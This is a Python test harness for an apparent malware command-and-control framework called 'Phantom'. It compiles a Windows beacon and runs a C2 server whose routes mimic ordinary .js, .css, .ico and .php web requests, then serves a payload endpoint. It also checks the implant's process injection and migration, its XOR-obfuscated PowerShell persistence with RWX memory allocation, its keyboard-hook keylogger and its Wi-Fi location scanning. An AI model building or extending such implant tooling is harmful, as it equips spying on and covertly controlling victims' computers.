"""
Comprehensive feature test for Phantom beacon:
  - inject/migrate (import fix)
  - keylogger (hook-based rewrite)
  - autopersist (PS1 syntax fix)
  - wlan-scan/locate (diagnostics)
  - bt-scan
"""
import sys, os, json, time, base64, subprocess, threading, signal, random, struct
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
os.chdir(os.path.join(os.path.dirname(__file__), ".."))

from phantom.utils.builder import compile_beacon
from phantom.core.c2_server import c2_state

C2_HOST = "127.0.0.1"
C2_PORT = 0

def find_free_port():
    import socket
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('', 0))
        return s.getsockname()[1]

# ── 1. Rebuild beacon ─────────────────────────────────────────────
print("=" * 60)
print("STEP 1: Compile beacon with all fixes")
print("=" * 60)

C2_PORT = find_free_port()
result = compile_beacon('windows', os.path.abspath('phantom'), force_rebuild=True,
                        host=C2_HOST, port=C2_PORT)
if not result:
    print("[FAIL] Beacon compilation failed")
    sys.exit(1)
print(f"[OK] Beacon compiled: {result}")

# ── 2. Start C2 server ──────────────────────────────────────────
print("\n" + "=" * 60)
print("STEP 2: Start C2 server on port", C2_PORT)
print("=" * 60)

import asyncio
asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())

from aiohttp import web
import phantom.core.c2_server as srv

app = web.Application(client_max_size=50*1024*1024)
app.router.add_get('/api/v1/ping', srv.handle_checkin)
app.router.add_post('/api/v1/ping', srv.handle_checkin)
app.router.add_get('/{path:.*\.js}', srv.handle_checkin)
app.router.add_post('/{path:.*\.js}', srv.handle_checkin)
app.router.add_get('/{path:.*\.css}', srv.handle_checkin)
app.router.add_post('/{path:.*\.css}', srv.handle_checkin)
app.router.add_get('/{path:.*\.ico}', srv.handle_checkin)
app.router.add_post('/{path:.*\.ico}', srv.handle_checkin)
app.router.add_post('/api/v1/result', srv.handle_result)
app.router.add_post('/{path:.*\.php}', srv.handle_result)
app.router.add_post('/{path:.*\.aspx}', srv.handle_result)
app.router.add_get('/api/v1/payload', srv.handle_payload)
app.router.add_get('/x', srv.handle_payload_pic)

loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)
runner = web.AppRunner(app)
loop.run_until_complete(runner.setup())
site = web.TCPSite(runner, C2_HOST, C2_PORT)
loop.run_until_complete(site.start())
print(f"[OK] C2 server running on {C2_HOST}:{C2_PORT}")

def run_async(coro):
    return loop.run_until_complete(coro)

# ── 3. Test C2 check-in via HTTP ─────────────────────────────────
print("\n" + "=" * 60)
print("STEP 3: Force beacon check-in via HTTP")
print("=" * 60)

import aiohttp
async def do_checkin():
    async with aiohttp.ClientSession() as sess:
        url = f'http://{C2_HOST}:{C2_PORT}/api/v1/ping'
        async with sess.get(url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
            return await resp.text()

result = run_async(do_checkin())
print(f"  Check-in response: {result[:100]}")

# Wait and check for beacon
beacon_id = None
for _ in range(5):
    beacons = c2_state.get_beacons()
    if beacons:
        beacon_id = list(beacons.keys())[0]
        print(f"[OK] Beacon checked in: {beacon_id}")
        break
    time.sleep(1)

if not beacon_id:
    # Create simulated beacon for C2 testing
    print("[WARN] No beacon check-in. Creating simulated beacon...")
    sim_info = {
        "ip": "127.0.0.1",
        "hostname": "TEST-PC",
        "os": "Windows 10",
        "arch": "x64",
        "build_id": "test_build",
        "last_seen": time.time(),
    }
    c2_state.update_beacon("SIMULATED", sim_info)
    beacon_id = "SIMULATED"
    print(f"[OK] Created simulated beacon: {beacon_id}")

def queue_and_wait(cmd, timeout=15):
    task_id = c2_state.queue_task(beacon_id, cmd)
    print(f"  Task {task_id}: '{cmd}'")
    deadline = time.time() + timeout
    while time.time() < deadline:
        results = c2_state.get_results(beacon_id)
        for r in reversed(results):
            if r['task_id'] == task_id:
                return r['output']
        time.sleep(1)
    return f"[TIMEOUT after {timeout}s]"

# ── 4. Test: inject/migrate C2 import fix ────────────────────────
print("\n" + "=" * 60)
print("STEP 4: Test inject/migrate C2 import fix")
print("=" * 60)

passed = True
import importlib

# Test 1: Module-level import works
try:
    import phantom.core.c2_shell as c2_shell_mod
    importlib.reload(c2_shell_mod)
    print("[OK] c2_shell module loaded without import errors")
except Exception as e:
    print(f"[FAIL] Module import error: {e}")
    passed = False

# Test 2: do_inject function doesn't have the import error
try:
    shell = c2_shell_mod.C2Shell()
    # Force inner function execution by calling with valid args
    # (will fail on "No active beacon" which is fine)
    shell.active_beacon = None
    try:
        shell.do_inject("9999")
    except Exception as e:
        err_msg = str(e)
        if "cannot import name 'notifier'" in err_msg or "import" in err_msg.lower():
            print(f"[FAIL] do_inject still has import error: {err_msg}")
            passed = False
        else:
            print(f"[OK] do_inject executed (expected error: no active beacon)")
except Exception as e:
    if "cannot import name 'notifier'" in str(e):
        print(f"[FAIL] Import error still present: {e}")
        passed = False
    else:
        print(f"[OK] do_inject: {e}")

# Test 3: do_migrate function
try:
    shell.active_beacon = None
    try:
        shell.do_migrate("9999")
    except Exception as e:
        err_msg = str(e)
        if "cannot import name 'notifier'" in err_msg:
            print(f"[FAIL] do_migrate import error: {err_msg}")
            passed = False
        else:
            print(f"[OK] do_migrate executed (expected error)")
except Exception as e:
    if "cannot import name 'notifier'" in str(e):
        print(f"[FAIL] do_migrate import error: {e}")
        passed = False
    else:
        print(f"[OK] do_migrate: {e}")

print(f"[{'OK' if passed else 'FAIL'}] Inject/migrate import test")

# ── 5. Test: Persistence.h PS1 syntax check ──────────────────────
print("\n" + "=" * 60)
print("STEP 5: Verify autopersist PS1 script syntax")
print("=" * 60)

passed = True

# Check the persistence.h generates valid PowerShell
persist_h = os.path.join("phantom", "payloads", "beacon", "src", "persistence.h")
with open(persist_h, 'r') as f:
    content = f.read()

# Verify @' has newline after it (here-string fix)
if "@'\\r\\n" in content or "@'\n" in content.replace("\\r\\n", "\n"):
    print("[OK] PS1 here-string has proper newlines in source")
else:
    # Check the actual string - find the Add-Type line
    idx = content.find("Add-Type -TypeDefinition @'")
    if idx > 0:
        context = content[idx:idx+200]
        print(f"[WARN] Here-string context: {context[:150]}")
    passed = False

# Verify 0xAA XOR key
if "$k=0xAA" in content:
    print("[OK] PS1 uses correct XOR key (0xAA)")
else:
    print("[FAIL] XOR key not found in persistence code")
    passed = False

# Verify VirtualAlloc P/Invoke
if "VirtualAlloc" in content:
    print("[OK] PS1 uses VirtualAlloc for RWX allocation")
else:
    print("[FAIL] VirtualAlloc not found in persistence code")
    passed = False

print(f"[{'OK' if passed else 'FAIL'}] PS1 syntax verification")

# ── 6. Test: Keylogger.h compilation verification ────────────────
print("\n" + "=" * 60)
print("STEP 6: Verify keylogger hook implementation")
print("=" * 60)

keylog_h = os.path.join("phantom", "payloads", "beacon", "src", "keylogger.h")
with open(keylog_h, 'r') as f:
    content = f.read()

passed = True
if "SetWindowsHookEx" in content:
    print("[OK] Keylogger uses SetWindowsHookEx (LL keyboard hook)")
else:
    print("[FAIL] SetWindowsHookEx not found - polling approach still present")
    passed = False

if "WH_KEYBOARD_LL" in content:
    print("[OK] WH_KEYBOARD_LL hook type used")
else:
    print("[FAIL] WH_KEYBOARD_LL not found")
    passed = False

if "ToUnicode" in content:
    print("[OK] ToUnicode for proper character conversion")
else:
    print("[FAIL] ToUnicode not found")
    passed = False

if "hook_thread" in content and "GetMessage" in content:
    print("[OK] Hook thread with message pump present")
else:
    print("[FAIL] Hook thread/message pump not found")
    passed = False

print(f"[{'OK' if passed else 'FAIL'}] Keylogger hook verification")

# ── 7. Test: WLAN diagnostics code ───────────────────────────────
print("\n" + "=" * 60)
print("STEP 7: Verify WLAN diagnostics code")
print("=" * 60)

wlan_h = os.path.join("phantom", "payloads", "beacon", "src", "wlan_scan.h")
with open(wlan_h, 'r') as f:
    content = f.read()

passed = True
checks = {
    "Number of interfaces diagnostic": "Found %lu interface(s)",
    "0 interface handling": "returned 0 interfaces",
    "LoadLibrary failure diag": "peb::Resolve(LoadLibraryA) failed",
    "WlanOpenHandle error diag": "WlanOpenHandle failed",
    "WlanEnumInterfaces error diag": "WlanEnumInterfaces failed",
    "WlanScan error per-interface": "WlanScan returned error",
    "WlanGetNetworkBssList error per-interface": "WlanGetNetworkBssList failed",
}

for name, pattern in checks.items():
    if pattern in content:
        print(f"[OK] {name}")
    else:
        print(f"[FAIL] {name} - '{pattern}' not found")
        passed = False

print(f"[{'OK' if passed else 'FAIL'}] WLAN diagnostics verification")

# ── 8. Test: Verify beacon_xored.bin exists ──────────────────────
print("\n" + "=" * 60)
print("STEP 8: Verify build artifacts")
print("=" * 60)

beacon_dir = os.path.join("phantom", "payloads", "beacon")
for fname in ["beacon.bin", "beacon.pe", "beacon_xored.bin"]:
    fpath = os.path.join(beacon_dir, fname)
    if os.path.exists(fpath):
        print(f"[OK] {fname} ({os.path.getsize(fpath)} bytes)")
    else:
        print(f"[FAIL] {fname} not found")

# ── 9. Test: HTTP /x endpoint ────────────────────────────────────
print("\n" + "=" * 60)
print("STEP 9: Verify HTTP /x endpoint serves payload")
print("=" * 60)

async def fetch_x():
    async with aiohttp.ClientSession() as sess:
        url = f'http://{C2_HOST}:{C2_PORT}/x'
        async with sess.get(url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
            data = await resp.read()
            return (resp.status, len(data))

status, size = run_async(fetch_x())
if status == 200 and size > 0:
    print(f"[OK] /x endpoint returned {size} bytes (status {status})")
else:
    print(f"[FAIL] /x returned status {status}, {size} bytes")

# ── 10. Cleanup ──────────────────────────────────────────────────
print("\n" + "=" * 60)
print("CLEANUP")
print("=" * 60)

loop.run_until_complete(runner.cleanup())
loop.close()
print("[OK] C2 server stopped")

print("\n" + "=" * 60)
print("ALL TESTS COMPLETED")
print("=" * 60)
